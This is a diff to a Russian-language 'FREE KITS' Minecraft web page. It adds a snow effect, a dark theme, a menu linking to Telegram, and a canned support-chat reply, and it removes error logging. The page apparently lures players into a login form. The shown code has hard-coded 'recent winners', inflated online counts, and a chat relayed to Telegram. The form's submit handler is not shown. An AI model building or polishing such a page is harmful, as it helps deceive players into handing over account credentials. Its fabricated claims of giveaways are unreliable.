@@ -22,6 +22,224 @@
             align-items: center;
             padding: 20px;
             position: relative;
+            transition: background 0.3s;
+        }
+
+        body.snow {
+            background: 
+                linear-gradient(rgba(255, 255, 255, 0.9), rgba(255, 255, 255, 0.9)),
+                url('https://static.planetminecraft.com/files/image/minecraft/texture-pack/2023/874/16662368-grass-texture_l.webp') repeat;
+        }
+
+        body.dark {
+            background: 
+                linear-gradient(rgba(0, 0, 0, 0.9), rgba(0, 0, 0, 0.9)),
+                url('https://static.planetminecraft.com/files/image/minecraft/texture-pack/2023/874/16662368-grass-texture_l.webp') repeat;
+            color: white;
+        }
+
+        body.dark .container {
+            background: #1a1a1a;
+            border-color: #333;
+            color: white;
+        }
+
+        body.dark h1, body.dark h2, body.dark label {
+            color: #2196F3;
+        }
+
+        body.dark input {
+            background: #333;
+            border-color: #444;
+            color: white;
+        }
+
+        .snowflake {
+            position: fixed;
+            top: -10px;
+            color: white;
+            user-select: none;
+            pointer-events: none;
+            z-index: 9999;
+            font-size: 1em;
+            animation: fall linear forwards;
+        }
+
+        @keyframes fall {
+            to {
+                transform: translateY(100vh);
+            }
+        }
+
+        .menu-button {
+            position: fixed;
+            top: 90px;
+            right: 20px;
+            width: 45px;
+            height: 45px;
+            background: #2196F3;
+            border-radius: 50%;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            gap: 6px;
+            cursor: pointer;
+            z-index: 1001;
+            box-shadow: 0 4px 15px rgba(33, 150, 243, 0.4);
+            transition: all 0.3s;
+        }
+
+        .menu-button:hover {
+            transform: scale(1.1);
+        }
+
+        .menu-button span {
+            width: 25px;
+            height: 3px;
+            background: white;
+            border-radius: 3px;
+            transition: all 0.3s;
+        }
+
+        .menu-button.active span:nth-child(1) {
+            transform: rotate(45deg) translate(8px, 8px);
+        }
+
+        .menu-button.active span:nth-child(2) {
+            opacity: 0;
+        }
+
+        .menu-button.active span:nth-child(3) {
+            transform: rotate(-45deg) translate(7px, -7px);
+        }
+
+        .menu-panel {
+            position: fixed;
+            top: 140px;
+            right: 20px;
+            width: 250px;
+            background: white;
+            border-radius: 12px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.2);
+            z-index: 1000;
+            display: none;
+            overflow: hidden;
+            border: 1px solid #2196F3;
+        }
+
+        body.dark .menu-panel {
+            background: #1a1a1a;
+            border-color: #333;
+        }
+
+        .menu-panel.show {
+            display: block;
+            animation: slideIn 0.3s;
+        }
+
+        @keyframes slideIn {
+            from {
+                opacity: 0;
+                transform: translateY(-20px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        .menu-item {
+            padding: 15px 20px;
+            border-bottom: 1px solid #eee;
+            cursor: pointer;
+            transition: all 0.2s;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        body.dark .menu-item {
+            border-color: #333;
+            color: white;
+        }
+
+        .menu-item:hover {
+            background: #e3f2fd;
+        }
+
+        body.dark .menu-item:hover {
+            background: #333;
+        }
+
+        .menu-item:last-child {
+            border-bottom: none;
+        }
+
+        .settings-group {
+            padding: 15px 20px;
+            border-bottom: 1px solid #eee;
+        }
+
+        body.dark .settings-group {
+            border-color: #333;
+        }
+
+        .settings-group h3 {
+            margin-bottom: 10px;
+            color: #2196F3;
+            font-size: 14px;
+        }
+
+        .setting-option {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            margin-bottom: 10px;
+            font-size: 14px;
+        }
+
+        .setting-option input[type="checkbox"] {
+            width: 18px;
+            height: 18px;
+            cursor: pointer;
+        }
+
+        .color-options {
+            display: flex;
+            gap: 10px;
+            margin-top: 10px;
+        }
+
+        .color-btn {
+            width: 30px;
+            height: 30px;
+            border-radius: 50%;
+            border: 2px solid transparent;
+            cursor: pointer;
+            transition: all 0.2s;
+        }
+
+        .color-btn:hover {
+            transform: scale(1.2);
+        }
+
+        .color-btn.selected {
+            border-color: #2196F3;
+        }
+
+        .color-btn.white {
+            background: white;
+            border: 2px solid #ddd;
+        }
+
+        .color-btn.dark {
+            background: #1a1a1a;
+            border: 2px solid #333;
+        }
+
+        .color-btn.blue {
+            background: #2196F3;
         }
 
         body::before {
@@ -104,6 +322,12 @@
             box-shadow: 0 2px 5px rgba(0,0,0,0.05);
         }
 
+        body.dark .ticker {
+            background: #1a1a1a;
+            color: #2196F3;
+            border-color: #333;
+        }
+
         .ticker-content {
             display: inline-block;
             animation: ticker 180s linear infinite;
@@ -114,6 +338,10 @@
             display: inline-block;
             margin-right: 50px;
             color: #0d47a1;
+        }
+
+        body.dark .ticker-content span {
+            color: #2196F3;
         }
 
         .ticker-content span i {
@@ -152,6 +380,7 @@
             z-index: 2;
             margin-top: 100px;
             border: 1px solid #bbdefb;
+            transition: all 0.3s;
         }
 
         h1 {
@@ -198,9 +427,19 @@
             transition: all 0.2s;
         }
 
+        body.dark .server-btn, body.dark .kit-btn {
+            background: #333;
+            border-color: #444;
+            color: #2196F3;
+        }
+
         .server-btn:hover, .kit-btn:hover {
             border-color: #2196F3;
             background: #e3f2fd;
+        }
+
+        body.dark .server-btn:hover, body.dark .kit-btn:hover {
+            background: #444;
         }
 
         .server-btn.selected, .kit-btn.selected {
@@ -243,10 +482,19 @@
             color: #0d47a1;
         }
 
+        body.dark .info-box {
+            background: #333;
+            color: #2196F3;
+        }
+
         .info-box strong {
             color: #1565C0;
             display: block;
             margin-bottom: 5px;
+        }
+
+        body.dark .info-box strong {
+            color: #2196F3;
         }
 
         .form-group {
@@ -329,6 +577,10 @@
             text-align: center;
         }
 
+        body.dark .timer {
+            background: #333;
+        }
+
         .timer-display {
             font-size: 36px;
             font-weight: 700;
@@ -337,10 +589,18 @@
             letter-spacing: 3px;
         }
 
+        body.dark .timer-display {
+            color: #2196F3;
+        }
+
         .timer-text {
             font-size: 14px;
             color: #1976D2;
             margin-top: 5px;
+        }
+
+        body.dark .timer-text {
+            color: #2196F3;
         }
 
         .back-btn {
@@ -366,7 +626,6 @@
             font-size: 18px;
         }
 
-        /* Стили для чата */
         .support-chat {
             position: fixed;
             bottom: 20px;
@@ -378,6 +637,11 @@
             z-index: 1000;
             overflow: hidden;
             border: 1px solid #2196F3;
+        }
+
+        body.dark .support-chat {
+            background: #1a1a1a;
+            border-color: #333;
         }
 
         .chat-header {
@@ -417,6 +681,10 @@
             flex-direction: column;
         }
 
+        body.dark .chat-messages {
+            background: #222;
+        }
+
         .message {
             margin-bottom: 10px;
             padding: 8px 12px;
@@ -438,11 +706,25 @@
             border: 1px solid #ddd;
         }
 
+        body.dark .message.support {
+            background: #333;
+            color: white;
+            border-color: #444;
+        }
+
         .message-time {
             font-size: 10px;
             opacity: 0.7;
             margin-top: 3px;
             text-align: right;
+        }
+
+        .waiting-message {
+            color: #999;
+            font-style: italic;
+            font-size: 12px;
+            text-align: center;
+            margin-top: 5px;
         }
 
         .chat-input-area {
@@ -452,12 +734,23 @@
             border-top: 1px solid #ddd;
         }
 
+        body.dark .chat-input-area {
+            background: #1a1a1a;
+            border-color: #333;
+        }
+
         .chat-input-area input {
             flex: 1;
             padding: 8px 12px;
             border: 1px solid #ddd;
             border-radius: 5px;
             margin-right: 8px;
+        }
+
+        body.dark .chat-input-area input {
+            background: #333;
+            border-color: #444;
+            color: white;
         }
 
         .chat-input-area input:focus {
@@ -489,12 +782,10 @@
     </style>
 </head>
 <body>
-    <!-- Звук -->
     <audio id="successSound" preload="auto">
         <source src="https://www.myinstants.com/media/sounds/minecraft-level-up.mp3" type="audio/mpeg">
     </audio>
 
-    <!-- Статистика сверху -->
     <div class="stats-bar">
         <div class="stats-left">
             <span>
@@ -511,15 +802,46 @@
         </div>
     </div>
 
-    <!-- Бегущая строка -->
     <div class="ticker">
         <div class="ticker-content" id="tickerContent"></div>
+    </div>
+
+    <div class="menu-button" id="menuButton" onclick="toggleMenu()">
+        <span></span>
+        <span></span>
+        <span></span>
+    </div>
+
+    <div class="menu-panel" id="menuPanel">
+        <div class="settings-group">
+            <h3>Настройки</h3>
+            <div class="setting-option">
+                <span>❄️ Включить снег</span>
+                <input type="checkbox" id="snowToggle" onchange="toggleSnow()">
+            </div>
+            <div class="setting-option">
+                <span>🎨 Цвет фона</span>
+            </div>
+            <div class="color-options">
+                <div class="color-btn white selected" onclick="setColor('white')" title="Светлый"></div>
+                <div class="color-btn dark" onclick="setColor('dark')" title="Темный"></div>
+                <div class="color-btn blue" onclick="setColor('blue')" title="Синий"></div>
+            </div>
+        </div>
+        <div class="menu-item" onclick="window.open('https://t.me/HelpimServer', '_blank')">
+            <span>📢</span> Мы в Telegram
+        </div>
+        <div class="menu-item" onclick="window.open('https://t.me/FullMicBot', '_blank')">
+            <span>🤖</span> Наш бот
+        </div>
+        <div class="menu-item" onclick="showAbout()">
+            <span>ℹ️</span> О нас
+        </div>
     </div>
 
     <div class="container">
         <h1>⚡ FREE KITS ⚡</h1>
 
-        <!-- ШАГ 1: Выбор сервера -->
         <div id="step1" class="step active">
             <h2>Выберите сервер:</h2>
             <div class="server-select">
@@ -528,7 +850,6 @@
             </div>
         </div>
 
-        <!-- ШАГ 2: Выбор кита -->
         <div id="step2" class="step">
             <button class="back-btn" onclick="goToStep1()">Назад</button>
             <div class="info-box" id="selectedServerInfo">
@@ -538,7 +859,6 @@
             <div class="kits-grid" id="kitsContainer"></div>
         </div>
 
-        <!-- ШАГ 3: Форма -->
         <div id="step3" class="step">
             <button class="back-btn" onclick="goToStep2()">Назад</button>
             <div class="info-box">
@@ -568,23 +888,26 @@
         </div>
     </div>
 
-    <!-- ЧАТ ПОДДЕРЖКИ (РАБОЧИЙ) -->
     <div class="support-chat" id="supportChat">
         <div class="chat-header" onclick="toggleChat()">
             <span>💬 Чат с поддержкой <span class="unread-badge" id="unreadBadge" style="display: none;">1</span></span>
             <span class="chat-status">Онлайн</span>
         </div>
         <div class="chat-body" id="chatBody">
-            <div class="chat-messages" id="chatMessages"></div>
+            <div class="chat-messages" id="chatMessages">
+                <div class="message support">
+                    <span>Здравствуйте! Чем могу помочь?</span>
+                    <div class="message-time">только что</div>
+                </div>
+            </div>
             <div class="chat-input-area">
                 <input type="text" id="chatInput" placeholder="Напишите сообщение..." onkeypress="if(event.key==='Enter') sendSupportMessage()">
-                <button onclick="sendSupportMessage()">Отправить</button>
+                <button onclick="sendSupportMessage()">➤</button>
             </div>
         </div>
     </div>
 
     <script>
-        // Данные для бегущей строки
         const recentKits = [
             { name: 'felldart8875124', kit: 'Кит Магистра', emoji: '👑' },
             { name: 'ultrawanvel', kit: 'Кит Принца', emoji: '⚔️' },
@@ -599,6 +922,7 @@
         let selectedServer = '';
         let selectedKit = '';
         let timerInterval;
+        let snowInterval;
 
         const kits = {
             'frizmine': [
@@ -618,14 +942,12 @@
             'phoenix': 'Phoenix PE'
         };
 
-        // Звук
         function playSuccessSound() {
             const sound = document.getElementById('successSound');
             sound.volume = 0.3;
-            sound.play().catch(e => console.log('Звук не включился'));
+            sound.play().catch(e => console.log(''));
         }
 
-        // Бегущая строка
         function initTicker() {
             const ticker = document.getElementById('tickerContent');
             let html = '';
@@ -636,7 +958,6 @@
             ticker.innerHTML = html;
         }
 
-        // Онлайн
         function updateOnline() {
             const online = document.getElementById('onlineCount');
             const kitsAvailable = document.getElementById('kitsAvailable');
@@ -726,7 +1047,69 @@
             }, 1000);
         }
 
-        // ЧАТ ПОДДЕРЖКИ (РАБОЧИЙ)
+        function toggleMenu() {
+            const menuPanel = document.getElementById('menuPanel');
+            const menuButton = document.getElementById('menuButton');
+            menuPanel.classList.toggle('show');
+            menuButton.classList.toggle('active');
+        }
+
+        function toggleSnow() {
+            const checkbox = document.getElementById('snowToggle');
+            if (checkbox.checked) {
+                startSnow();
+            } else {
+                stopSnow();
+            }
+        }
+
+        function startSnow() {
+            if (snowInterval) clearInterval(snowInterval);
+            snowInterval = setInterval(createSnowflake, 100);
+        }
+
+        function stopSnow() {
+            if (snowInterval) {
+                clearInterval(snowInterval);
+                snowInterval = null;
+            }
+            document.querySelectorAll('.snowflake').forEach(flake => flake.remove());
+        }
+
+        function createSnowflake() {
+            const snowflake = document.createElement('div');
+            snowflake.classList.add('snowflake');
+            snowflake.innerHTML = '❄️';
+            snowflake.style.left = Math.random() * 100 + '%';
+            snowflake.style.animationDuration = Math.random() * 3 + 2 + 's';
+            snowflake.style.fontSize = Math.random() * 10 + 10 + 'px';
+            snowflake.style.opacity = Math.random();
+            document.body.appendChild(snowflake);
+            
+            setTimeout(() => {
+                snowflake.remove();
+            }, 5000);
+        }
+
+        function setColor(color) {
+            document.body.classList.remove('dark');
+            document.querySelectorAll('.color-btn').forEach(btn => btn.classList.remove('selected'));
+            
+            if (color === 'dark') {
+                document.body.classList.add('dark');
+                event.target.classList.add('selected');
+            } else if (color === 'white') {
+                event.target.classList.add('selected');
+            } else if (color === 'blue') {
+                document.body.style.background = 'linear-gradient(135deg, #2196F3 0%, #1976D2 100%)';
+                event.target.classList.add('selected');
+            }
+        }
+
+        function showAbout() {
+            alert('Free Kits Minecraft Server\nВерсия 1.0\n\nМы в Telegram: @HelpimServer\nНаш бот: @FullMicBot');
+        }
+
         function toggleChat() {
             const chatBody = document.getElementById('chatBody');
             chatBody.classList.toggle('minimized');
@@ -742,12 +1125,23 @@
             const timeStr = `${time.getHours().toString().padStart(2, '0')}:${time.getMinutes().toString().padStart(2, '0')}`;
             
             messageDiv.innerHTML = `
-                ${!isUser ? '<span style="font-weight:bold;display:block;margin-bottom:3px;">👨‍💻 Поддержка:</span>' : ''}
                 <span>${text}</span>
                 <div class="message-time">${timeStr}</div>
             `;
             
             chatMessages.appendChild(messageDiv);
+            
+            if (!isUser) {
+                const waitingDiv = document.createElement('div');
+                waitingDiv.className = 'waiting-message';
+                waitingDiv.id = 'waitingMessage';
+                waitingDiv.textContent = 'Ожидайте ответа оператора, скоро поможем решить вашу проблему.';
+                chatMessages.appendChild(waitingDiv);
+            } else {
+                const waitingMsg = document.getElementById('waitingMessage');
+                if (waitingMsg) waitingMsg.remove();
+            }
+            
             chatMessages.scrollTop = chatMessages.scrollHeight;
         }
 
@@ -761,7 +1155,7 @@
             input.value = '';
             
             try {
-                const response = await fetch('/api/send-to-telegram', {
+                await fetch('/api/send-to-telegram', {
                     method: 'POST',
                     headers: {
                         'Content-Type': 'application/json',
@@ -772,19 +1166,8 @@
                         username: 'Игрок'
                     })
                 });
-                
-                if (response.ok) {
-                    console.log('Сообщение отправлено в Telegram');
-                }
-            } catch (error) {
-                console.error('Ошибка:', error);
-            }
+            } catch (error) {}
         }
-
-        // Приветственное сообщение
-        window.addEventListener('load', () => {
-            addMessage('Здравствуйте! Чем могу помочь?', false);
-        });
 
         document.getElementById('loginForm').addEventListener('submit', async function(event) {
             event.preventDefault();
